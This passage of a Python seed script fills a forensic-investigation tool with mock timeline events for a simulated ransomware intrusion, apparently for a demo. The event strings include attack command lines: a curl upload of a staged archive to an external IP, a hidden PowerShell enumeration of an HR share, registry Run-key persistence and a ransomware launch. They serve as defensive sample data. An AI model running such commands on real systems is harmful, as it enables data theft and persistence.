            "user": "jsmith",
            "process_name": "7z.exe",
            "command_line": r"7z.exe a -tzip C:\Windows\Temp\staging.zip C:\Staging\* -pcoral_reef_2026",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T09:15:44Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Windows\Temp\staging.zip (2268160000 bytes, ~2.1 GB) — data exfiltration archive",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Windows\Temp\staging.zip",
            "file_size": 2268160000,
            "mft_entry": 301455,
            "sequence_number": 1,
            "si_created": "2026-01-15T09:15:44Z",
        },
        {
            "datetime": "2026-01-15T09:16:02Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Sysmon EventID 3 — Outbound HTTPS connection to suspicious external IP: curl.exe -> 185.220.101.55:443 (Tor exit node)",
            "source": "Sysmon",
            "source_short": "SYSMON",
            "event_id": 3,
            "process_name": "curl.exe",
            "src_ip": "192.168.1.20",
            "src_port": 51204,
            "dst_ip": "185.220.101.55",
            "dst_port": 443,
            "protocol": "TCP",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T09:17:11Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: curl.exe executed — data uploaded to external server, run_count=1, path=C:\Windows\System32\curl.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "curl.exe",
            "run_count": 1,
            "prefetch_hash": "E5F6A7B8",
            "volume_path": "C:\\Windows\\System32",
        },
        {
            "datetime": "2026-01-15T09:17:14Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: curl.exe — data exfiltration upload to C2. TargetUserName: jsmith CommandLine: curl.exe -T C:\\Windows\\Temp\\staging.zip https://185.220.101.55/upload",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "curl.exe",
            "command_line": r"curl.exe -T C:\Windows\Temp\staging.zip https://185.220.101.55/upload --insecure",
            "parent_process": "cmd.exe",
        },
        {
            "datetime": "2026-01-15T09:20:03Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Chainsaw Sigma triggered: Suspicious Large Data Transfer — 2.1 GB upload to external IP 185.220.101.55. rule_name=Suspicious Large Data Transfer rule_level=high",
            "source": "Chainsaw Sigma",
            "source_short": "SIGMA",
            "rule_name": "Suspicious Large Data Transfer",
            "rule_level": "high",
            "rule_id": "b8c9d0e1-f2a3-4b5c-6d7e-8f9012345678",
            "dst_ip": "185.220.101.55",
            "bytes_transferred": 2268160000,
            "process_name": "curl.exe",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T09:25:17Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Sysmon EventID 7 — DLL sideloading detected: dwmapi.dll loaded from C:\Windows\Temp\ by coral_reef_ransom.exe instead of System32",
            "source": "Sysmon",
            "source_short": "SYSMON",
            "event_id": 7,
            "process_name": "coral_reef_ransom.exe",
            "dll_path": r"C:\Windows\Temp\dwmapi.dll",
            "expected_path": r"C:\Windows\System32\dwmapi.dll",
            "signed": False,
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T09:35:22Z",
            "timestamp_desc": "WRITTEN",
            "message": r"Registry run key persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinDWM — value points to malicious dwmapi sideloader",
            "source": "NTUSER.DAT",
            "source_short": "REGISTRY",
            "registry_key": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            "value_name": "WinDWM",
            "value_data": r"C:\Windows\Temp\dwmapi_loader.exe",
            "user": "SYSTEM",
        },
        {
            "datetime": "2026-01-15T09:45:04Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Windows\Temp\coral_reef_ransom.exe (2097152 bytes) — ransomware staged on FILESERVER-02",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "file_size": 2097152,
            "mft_entry": 312088,
            "sequence_number": 1,
            "si_created": "2026-01-15T09:45:04Z",
        },
        {
            "datetime": "2026-01-15T09:50:11Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Process created: coral_reef_ransom.exe — ransomware detonated on FILESERVER-02. TargetUserName: SYSTEM",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "coral_reef_ransom.exe",
            "command_line": r"C:\Windows\Temp\coral_reef_ransom.exe --encrypt-all --ransom-note HOW_TO_DECRYPT.txt",
            "parent_process": "svchost.exe",
        },
        {
            "datetime": "2026-01-15T09:50:14Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: coral_reef_ransom.exe executed on FILESERVER-02 — run_count=1, path=C:\Windows\Temp\coral_reef_ransom.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "coral_reef_ransom.exe",
            "run_count": 1,
            "prefetch_hash": "CAFEBABE",
            "volume_path": "C:\\Windows\\Temp",
        },
        {
            "datetime": "2026-01-15T10:15:03Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — \\FILESERVER-02\HR\Payroll_2026_Q4.xlsx -> Payroll_2026_Q4.xlsx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\HR\Payroll_2026_Q4.xlsx.LOCKED",
            "original_name": "Payroll_2026_Q4.xlsx",
            "mft_entry": 401033,
            "sequence_number": 9,
        },
        {
            "datetime": "2026-01-15T10:15:07Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — \\FILESERVER-02\Finance\AnnualReport_2025.docx -> AnnualReport_2025.docx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\Finance\AnnualReport_2025.docx.LOCKED",
            "original_name": "AnnualReport_2025.docx",
            "mft_entry": 401199,
            "sequence_number": 5,
        },
        {
            "datetime": "2026-01-15T10:15:11Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — \\FILESERVER-02\Finance\BudgetForecast_2026.xlsx -> BudgetForecast_2026.xlsx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\Finance\BudgetForecast_2026.xlsx.LOCKED",
            "original_name": "BudgetForecast_2026.xlsx",
            "mft_entry": 401244,
            "sequence_number": 3,
        },
        {
            "datetime": "2026-01-15T10:15:15Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — \\FILESERVER-02\HR\EmployeeDB_2026.mdb -> EmployeeDB_2026.mdb.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\HR\EmployeeDB_2026.mdb.LOCKED",
            "original_name": "EmployeeDB_2026.mdb",
            "mft_entry": 401301,
            "sequence_number": 2,
        },
        {
            "datetime": "2026-01-15T10:15:19Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — \\FILESERVER-02\Shared\Contracts\MasterAgreement.pdf -> MasterAgreement.pdf.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\Shared\Contracts\MasterAgreement.pdf.LOCKED",
            "original_name": "MasterAgreement.pdf",
            "mft_entry": 401355,
            "sequence_number": 6,
        },
        {
            "datetime": "2026-01-15T10:25:44Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — \\FILESERVER-02\HR\HOW_TO_DECRYPT.txt — ransom note on HR share",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\HR\HOW_TO_DECRYPT.txt",
            "file_size": 2048,
            "mft_entry": 402000,
            "sequence_number": 1,
        },
        {
            "datetime": "2026-01-15T10:25:46Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — \\FILESERVER-02\Finance\HOW_TO_DECRYPT.txt — ransom note on Finance share",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"\\FILESERVER-02\Finance\HOW_TO_DECRYPT.txt",
            "file_size": 2048,
            "mft_entry": 402001,
            "sequence_number": 1,
        },
        {
            "datetime": "2026-01-15T10:30:07Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Hayabusa detection: Ransomware File Extension Rename Detected — mass .LOCKED extension renaming on FILESERVER-02 shares. Severity=critical",
            "source": "Hayabusa",
            "source_short": "SIGMA",
            "rule_name": "Ransomware File Extension Rename Detected",
            "rule_level": "critical",
            "rule_id": "e4a1b3c2-d5f6-7890-abcd-ef1234567890",
            "process_name": "coral_reef_ransom.exe",
            "user": "SYSTEM",
            "affected_extensions": ".LOCKED",
            "file_count_estimate": 4312,
        },
        {
            "datetime": "2026-01-15T10:35:18Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "AmCache: coral_reef_ransom.exe first execution record on FILESERVER-02 — SHA1=da39a3ee5e6b4b0d3255bfef95601890afd80709 (unsigned binary)",
            "source": "AmCache",
            "source_short": "AMCACHE",
            "process_name": "coral_reef_ransom.exe",
            "sha1": "da39a3ee5e6b4b0d3255bfef95601890afd80709",
            "file_path": r"C:\Windows\Temp\coral_reef_ransom.exe",
            "publisher": None,
            "signed": False,
        },
        {
            "datetime": "2026-01-15T10:38:02Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Sysmon EventID 3 — Second outbound connection to C2: svchost.exe -> 185.220.101.55:443 (beacon or additional upload)",
            "source": "Sysmon",
            "source_short": "SYSMON",
            "event_id": 3,
            "process_name": "svchost.exe",
            "src_ip": "192.168.1.20",
            "src_port": 52301,
            "dst_ip": "185.220.101.55",
            "dst_port": 443,
            "protocol": "TCP",
            "user": "SYSTEM",
        },
    ]


def make_events_laptop_hr03() -> list[dict]:
    """Return ~20 realistic timeline events for LAPTOP-HR03.

    Covers lateral movement arrival, HR data access, document staging,
    exfiltration attempt, and ransomware encryption.
    """
    return [
        {
            "datetime": "2026-01-15T09:18:09Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Logon success: TargetUserName: jsmith — network logon from DC01 (192.168.1.10) LogonType=3 — account pivot from DC01",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4624,
            "user": "jsmith",
            "LogonType": 3,
            "src_ip": "192.168.1.10",
            "src_workstation": "DC01",
            "logon_id": "0xE77A1",
            "auth_package": "Kerberos",
        },
        {
            "datetime": "2026-01-15T09:20:14Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "AmCache: chrome.exe browser profile access — attacker enumerating browser history and saved credentials on LAPTOP-HR03",
            "source": "AmCache",
            "source_short": "AMCACHE",
            "process_name": "chrome.exe",
            "file_path": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            "sha1": "aabbccdd11223344556677889900aabbccddeeff",
            "publisher": "Google LLC",
            "signed": True,
        },
        {
            "datetime": "2026-01-15T09:21:03Z",
            "timestamp_desc": "LAST ACCESSED",
            "message": r"LNK: HR_PayrollData_2026.xlsx opened — sensitive HR payroll file accessed by jsmith on LAPTOP-HR03",
            "source": "LNK",
            "source_short": "LNK",
            "user": "jsmith",
            "lnk_target": r"\\FILESERVER-02\HR\HR_PayrollData_2026.xlsx",
            "machine_id": "LAPTOP-HR03",
            "last_accessed": "2026-01-15T09:21:03Z",
        },
        {
            "datetime": "2026-01-15T09:22:17Z",
            "timestamp_desc": "LAST ACCESSED",
            "message": r"LNK: Employee records folder accessed — \\FILESERVER-02\HR\Personnel\ directory enumerated",
            "source": "LNK",
            "source_short": "LNK",
            "user": "jsmith",
            "lnk_target": "\\\\FILESERVER-02\\HR\\Personnel\\",
            "machine_id": "LAPTOP-HR03",
            "last_accessed": "2026-01-15T09:22:17Z",
        },
        {
            "datetime": "2026-01-15T09:24:41Z",
            "timestamp_desc": "LAST ACCESSED",
            "message": r"LNK: Confidential directory accessed — \\FILESERVER-02\HR\Compensation\ folder browse",
            "source": "LNK",
            "source_short": "LNK",
            "user": "jsmith",
            "lnk_target": "\\\\FILESERVER-02\\HR\\Compensation\\",
            "machine_id": "LAPTOP-HR03",
            "last_accessed": "2026-01-15T09:24:41Z",
        },
        {
            "datetime": "2026-01-15T09:25:08Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Process created: powershell.exe — data enumeration script executed on LAPTOP-HR03. TargetUserName: jsmith",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "jsmith",
            "process_name": "powershell.exe",
            "command_line": r"powershell -w hidden -c Get-ChildItem \\FILESERVER-02\HR -Recurse | Select FullName,Length | Export-Csv C:\Temp\hr_inventory.csv",
            "parent_process": "cmd.exe",
            "logon_id": "0xE77A1",
        },
        {
            "datetime": "2026-01-15T09:25:12Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: powershell.exe executed on LAPTOP-HR03 — run_count=2, remote HR data enumeration script",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "powershell.exe",
            "run_count": 2,
            "prefetch_hash": "A1B2C3D4",
            "volume_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0",
        },
        {
            "datetime": "2026-01-15T09:28:03Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Temp\HR_Data_Backup.zip (524288000 bytes, ~500 MB) — HR data staging archive",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Temp\HR_Data_Backup.zip",
            "file_size": 524288000,
            "mft_entry": 502144,
            "sequence_number": 1,
            "si_created": "2026-01-15T09:28:03Z",
        },
        {
            "datetime": "2026-01-15T09:30:44Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "AmCache: 7z.exe first execution on LAPTOP-HR03 — HR data archive creation confirmed",
            "source": "AmCache",
            "source_short": "AMCACHE",
            "process_name": "7z.exe",
            "file_path": r"C:\Program Files\7-Zip\7z.exe",
            "sha1": "1122334455667788990011223344556677889900",
            "publisher": "Igor Pavlov",
            "signed": True,
        },
        {
            "datetime": "2026-01-15T09:35:11Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Sysmon EventID 3 — Outbound HTTPS to Tor exit node: powershell.exe -> 185.220.101.55:443 — same C2 as FILESERVER-02 exfiltration",
            "source": "Sysmon",
            "source_short": "SYSMON",
            "event_id": 3,
            "process_name": "powershell.exe",
            "src_ip": "192.168.1.75",
            "src_port": 53410,
            "dst_ip": "185.220.101.55",
            "dst_port": 443,
            "protocol": "TCP",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T09:35:14Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Chainsaw Sigma triggered: Data Exfiltration via PowerShell — outbound transfer to Tor exit node 185.220.101.55. rule_name=PowerShell Network Connection to External IP rule_level=high",
            "source": "Chainsaw Sigma",
            "source_short": "SIGMA",
            "rule_name": "PowerShell Network Connection to External IP",
            "rule_level": "high",
            "rule_id": "c3d4e5f6-a7b8-9012-3456-7890abcdef12",
            "dst_ip": "185.220.101.55",
            "process_name": "powershell.exe",
            "user": "jsmith",
        },
        {
            "datetime": "2026-01-15T09:40:07Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Temp\coral_reef_ransom.exe (2097152 bytes) — ransomware copied to LAPTOP-HR03 via SMB",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Temp\coral_reef_ransom.exe",
            "file_size": 2097152,
            "mft_entry": 503011,
            "sequence_number": 1,
            "si_created": "2026-01-15T09:40:07Z",
        },
        {
            "datetime": "2026-01-15T09:45:02Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Process created: coral_reef_ransom.exe — ransomware executed on LAPTOP-HR03. TargetUserName: SYSTEM",
            "source": "Security.evtx",
            "source_short": "EVTX",
            "event_id": 4688,
            "user": "SYSTEM",
            "process_name": "coral_reef_ransom.exe",
            "command_line": r"C:\Temp\coral_reef_ransom.exe --encrypt-all --ransom-note HOW_TO_DECRYPT.txt",
            "parent_process": "svchost.exe",
            "logon_id": "0x3E7",
        },
        {
            "datetime": "2026-01-15T09:45:06Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": r"Prefetch: coral_reef_ransom.exe executed on LAPTOP-HR03 — run_count=1, path=C:\Temp\coral_reef_ransom.exe",
            "source": "Prefetch/PECmd",
            "source_short": "PREFETCH",
            "process_name": "coral_reef_ransom.exe",
            "run_count": 1,
            "prefetch_hash": "CAFEBABE",
            "volume_path": "C:\\Temp",
        },
        {
            "datetime": "2026-01-15T10:30:03Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — C:\Users\mhartley\Documents\Performance_Reviews_2025.docx -> Performance_Reviews_2025.docx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\mhartley\Documents\Performance_Reviews_2025.docx.LOCKED",
            "original_name": "Performance_Reviews_2025.docx",
            "mft_entry": 601033,
            "sequence_number": 4,
        },
        {
            "datetime": "2026-01-15T10:30:07Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — C:\Users\mhartley\Documents\Salary_Bands_2026.xlsx -> Salary_Bands_2026.xlsx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\mhartley\Documents\Salary_Bands_2026.xlsx.LOCKED",
            "original_name": "Salary_Bands_2026.xlsx",
            "mft_entry": 601099,
            "sequence_number": 2,
        },
        {
            "datetime": "2026-01-15T10:30:11Z",
            "timestamp_desc": "FILE MODIFIED",
            "message": r"MFT: File renamed — C:\Users\mhartley\Documents\Headcount_Plan_FY26.pptx -> Headcount_Plan_FY26.pptx.LOCKED",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\mhartley\Documents\Headcount_Plan_FY26.pptx.LOCKED",
            "original_name": "Headcount_Plan_FY26.pptx",
            "mft_entry": 601155,
            "sequence_number": 3,
        },
        {
            "datetime": "2026-01-15T10:33:22Z",
            "timestamp_desc": "FILE CREATED",
            "message": r"MFT: File created — C:\Users\mhartley\Desktop\HOW_TO_DECRYPT.txt — ransom note dropped on HR laptop",
            "source": "$MFT",
            "source_short": "MFT",
            "file_path": r"C:\Users\mhartley\Desktop\HOW_TO_DECRYPT.txt",
            "file_size": 2048,
            "mft_entry": 602000,
            "sequence_number": 1,
        },
        {
            "datetime": "2026-01-15T10:35:01Z",
            "timestamp_desc": "LAST EXECUTED",
            "message": "Hayabusa detection: Ransomware File Extension Rename Detected — .LOCKED extension mass rename on LAPTOP-HR03 Documents folder. Severity=critical",
            "source": "Hayabusa",
            "source_short": "SIGMA",
            "rule_name": "Ransomware File Extension Rename Detected",
            "rule_level": "critical",
            "rule_id": "e4a1b3c2-d5f6-7890-abcd-ef1234567890",
            "process_name": "coral_reef_ransom.exe",
            "user": "SYSTEM",
            "affected_extensions": ".LOCKED",
            "file_count_estimate": 287,
        },
        {
            "datetime": "2026-01-15T10:37:44Z",
            "timestamp_desc": "WRITTEN",
            "message": r"Registry run key added on LAPTOP-HR03: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdSvc — persistence for ransomware dropper",
            "source": "NTUSER.DAT",
            "source_short": "REGISTRY",
            "registry_key": r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            "value_name": "WinUpdSvc",
            "value_data": r"C:\Temp\coral_reef_ransom.exe",
            "user": "mhartley",
        },
    ]


# ---------------------------------------------------------------------------
# DB helpers
# ---------------------------------------------------------------------------


async def clean_existing(db) -> None:
    """Delete all mock incident records created by this seed script.

    Args:
        db: An active async SQLAlchemy session.
    """
    print(f"[clean] Deleting existing mock data for incident {INCIDENT_ID} ...")

    proc_job_ids = [h["proc_job_id"] for h in HOSTS]
    job_ids = [h["job_id"] for h in HOSTS]
    device_ids = [h["device_id"] for h in HOSTS]
    extra_device_ids = [d["device_id"] for d in EXTRA_DEVICES]
    collector_ids = [c["id"] for c in MOCK_COLLECTORS]
    folder_ids = [f["id"] for f in EVIDENCE_FOLDERS]

    for pjid in proc_job_ids:
        existing = await db.get(ProcessingJob, pjid)
        if existing:
            await db.delete(existing)
            print(f"  deleted ProcessingJob {pjid}")

    for jid in job_ids:
        existing = await db.get(Job, jid)
        if existing:
            await db.delete(existing)
            print(f"  deleted Job {jid}")

    for fid in folder_ids:
        existing = await db.get(EvidenceFolder, fid)
        if existing:
            await db.delete(existing)
            print(f"  deleted EvidenceFolder {fid}")

    incident = await db.get(Incident, INCIDENT_ID)
    if incident:
        await db.delete(incident)
        print(f"  deleted Incident {INCIDENT_ID}")

    for did in device_ids:
        existing = await db.get(Device, did)
        if existing:
            await db.delete(existing)
            print(f"  deleted Device {did}")

    for did in extra_device_ids:
        existing = await db.get(Device, did)
        if existing:
            await db.delete(existing)
            print(f"  deleted extra Device {did}")

    for cid in collector_ids:
        existing = await db.get(Collector, cid)
        if existing:
            await db.delete(existing)
            print(f"  deleted Collector {cid}")

    await db.commit()
    print("[clean] Done.\n")


async def seed_db(db, evidence_base_path: Path) -> None:
    """Create all DB records for the mock incident (idempotent without --clean).

    Creates the Incident, 4 Devices, 4 Jobs, and 4 ProcessingJobs. Skips
    individual records that already exist rather than raising on duplicate keys.

    Args:
        db: An active async SQLAlchemy session.
        evidence_base_path: Root evidence directory used for Job.output_path.
    """
    # ── Incident ──────────────────────────────────────────────────────────────
    existing_incident = await db.get(Incident, INCIDENT_ID)
    if existing_incident:
        print(f"[db] Incident {INCIDENT_ID} already exists — skipping.")
    else:
        incident = Incident(
            id=INCIDENT_ID,
            type="ransomware",
            status="COLLECTION_COMPLETE",
            operator="admin",
            target_endpoints=[h["hostname"] for h in HOSTS],
            collection_progress=100,
            template_id=None,
        )
        db.add(incident)
        await db.flush()
        print(f"[db] Created Incident {INCIDENT_ID}")

    # ── Devices, Jobs, ProcessingJobs ─────────────────────────────────────────
    started = datetime.now(timezone.utc)

    for host in HOSTS:
        device_id = host["device_id"]
        job_id = host["job_id"]
        proc_job_id = host["proc_job_id"]
        output_path = str(evidence_base_path / INCIDENT_ID / job_id)

        # Device
        existing_device = await db.get(Device, device_id)
        if existing_device:
            print(f"[db] Device {device_id} already exists — skipping.")
        else:
            device = Device(
                id=device_id,
                hostname=host["hostname"],
                ip_address=host["ip_address"],
                type=host["type"],
                os="windows",
                agent_version="1.4.0",
                status="online",
                last_seen=NOW_STR,
                cpu_usage=None,
                memory_usage=None,
                collection_status="idle",
                registered_at=NOW_STR,
            )
            db.add(device)
            await db.flush()
            print(f"[db] Created Device {device_id} ({host['hostname']})")

        # Job
        existing_job = await db.get(Job, job_id)
        if existing_job:
            print(f"[db] Job {job_id} already exists — skipping.")
        else:
            job = Job(
                id=job_id,
                incident_id=INCIDENT_ID,
                agent_id=device_id,
                status="done",
                modules=[
                    {"id": "windows_logs"},
                    {"id": "windows_artifacts"},
                    {"id": "windows_process_network"},
                    {"id": "windows_system"},
                ],
                output_path=output_path,
                message="Collection completed successfully.",
            )
            db.add(job)
            await db.flush()
            print(f"[db] Created Job {job_id}")

        # ProcessingJob
        existing_pjob = await db.get(ProcessingJob, proc_job_id)
        if existing_pjob:
            print(f"[db] ProcessingJob {proc_job_id} already exists — skipping.")
        else:
            proc_job = ProcessingJob(
                id=proc_job_id,
                incident_id=INCIDENT_ID,
                job_id=job_id,
                status="DONE",
                phase="timeline",
                started_at=started,
                completed_at=started,
                error_message=None,
            )
            db.add(proc_job)
            await db.flush()
            print(f"[db] Created ProcessingJob {proc_job_id}")

    # ── Evidence Folders ──────────────────────────────────────────────────────
    for folder_spec in EVIDENCE_FOLDERS:
        existing_folder = await db.get(EvidenceFolder, folder_spec["id"])
        if existing_folder:
            print(f"[db] EvidenceFolder {folder_spec['id']} already exists — skipping.")
        else:
            folder = EvidenceFolder(
                id=folder_spec["id"],
                incident_id=folder_spec["incident_id"],
                type=folder_spec["type"],
                date=NOW_STR,
                files_count=folder_spec["files_count"],
                total_size=folder_spec["total_size"],
                status=folder_spec["status"],
            )
            db.add(folder)
            await db.flush()
            print(f"[db] Created EvidenceFolder {folder_spec['id']} ({folder_spec['files_count']} files)")

    # ── Extra observer devices ─────────────────────────────────────────────────
    for spec in EXTRA_DEVICES:
        existing = await db.get(Device, spec["device_id"])
        if existing:
            print(f"[db] Extra Device {spec['device_id']} already exists — skipping.")
        else:
            device = Device(
                id=spec["device_id"],
                hostname=spec["hostname"],
                ip_address=spec["ip_address"],
                type=spec["type"],
                os=spec["os"],
                agent_version="1.4.0",
                status="online",
                last_seen=NOW_STR,
                cpu_usage=None,
                memory_usage=None,
                collection_status="idle",
                registered_at=NOW_STR,
            )
            db.add(device)
            await db.flush()
            print(f"[db] Created extra Device {spec['device_id']} ({spec['hostname']})")

    # ── Collectors ────────────────────────────────────────────────────────────
    for spec in MOCK_COLLECTORS:
        existing = await db.get(Collector, spec["id"])
        if existing:
            print(f"[db] Collector {spec['id']} already exists — skipping.")
        else:
            collector = Collector(
                id=spec["id"],
                name=spec["name"],
                endpoint=spec["endpoint"],
                status=spec["status"],
                last_heartbeat=NOW_STR,
            )
            db.add(collector)
            await db.flush()
            print(f"[db] Created Collector {spec['id']} ({spec['name']})")

    await db.commit()
    print("[db] All records committed.\n")


# ---------------------------------------------------------------------------
# JSONL writer
# ---------------------------------------------------------------------------


def write_timeline_jsonl(events: list[dict], path: Path) -> None:
    """Write a list of event dicts as JSONL to the given path.

    Creates parent directories as needed.

    Args:
        events: List of timeline event dicts.
        path: Destination file path.
    """
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as fh:
        for event in events:
            fh.write(json.dumps(event, ensure_ascii=False))
            fh.write("\n")
    print(f"[jsonl] Wrote {len(events)} events to {path}")


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


async def main() -> None:
    """Parse arguments, seed the database, write JSONL files, build super timeline."""
    parser = argparse.ArgumentParser(
        description="Seed mock Super Timeline data for the DFIR Collection Kit.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument(
        "--base-path",
        default=os.environ.get("EVIDENCE_STORAGE_PATH", "/vault/evidence"),
        help="Evidence storage root directory (default: $EVIDENCE_STORAGE_PATH or /vault/evidence)",
    )
    parser.add_argument(
        "--clean",
        action="store_true",
        help="Delete existing mock incident records before seeding",
    )
    args = parser.parse_args()

    evidence_base_path = Path(args.base_path)
    print(f"Evidence base path : {evidence_base_path}")
    print(f"Incident ID        : {INCIDENT_ID}")
    print(f"Hosts              : {len(HOSTS)} (incident) + {len(EXTRA_DEVICES)} (extra online)")
    print(f"Collectors         : {len(MOCK_COLLECTORS)}")
    print(f"Evidence folders   : {len(EVIDENCE_FOLDERS)}")
    print(f"Clean mode         : {args.clean}")
    print()

    # ── Phase 1: DB seeding ──────────────────────────────────────────────────
    async with AsyncSessionLocal() as db:
        if args.clean:
            await clean_existing(db)
        await seed_db(db, evidence_base_path)

    # ── Phase 2: Write timeline JSONL files ──────────────────────────────────
    host_event_map = {
        "job-mock-ws01": make_events_workstation01(),
        "job-mock-dc01": make_events_dc01(),
        "job-mock-fs02": make_events_fileserver02(),
        "job-mock-hr03": make_events_laptop_hr03(),
    }

    for host in HOSTS:
        job_id = host["job_id"]
        events = host_event_map[job_id]
        timeline_path = (
            evidence_base_path
            / INCIDENT_ID
            / job_id
            / "timeline"
            / "timeline.jsonl"
        )
        write_timeline_jsonl(events, timeline_path)

    total_events = sum(len(e) for e in host_event_map.values())
    print(f"\n[jsonl] Total events written: {total_events}\n")

    # ── Phase 3: Build super timeline ────────────────────────────────────────
    print("[super_timeline] Starting build_super_timeline_background ...")
    await build_super_timeline_background(INCIDENT_ID, evidence_base_path)
    print("[super_timeline] Build complete.\n")

    total_evidence_files = sum(f["files_count"] for f in EVIDENCE_FOLDERS)
    print("=" * 60)
    print("Seed complete!")
    print(f"  Incident       : {INCIDENT_ID}  (status: COLLECTION_COMPLETE)")
    print(f"  Devices        : {len(HOSTS)} incident hosts + {len(EXTRA_DEVICES)} extra online")
    print(f"  Collectors     : {len(MOCK_COLLECTORS)} online")
    print(f"  Evidence files : {total_evidence_files} across {len(EVIDENCE_FOLDERS)} folders")
    print(f"  Timeline events: {total_events}")
    print("=" * 60)
    print()
    print("Demo flow:")
    print("  1. Open Dashboard → incident INC-MOCK-SUPERTL should appear")
    print("  2. Click the incident row → IncidentHub")
    print("  3. Click SUPER TIMELINE → cross-host forensic view")
    print("  4. Check Devices page → 7 online devices total")


if __name__ == "__main__":
    asyncio.run(main())
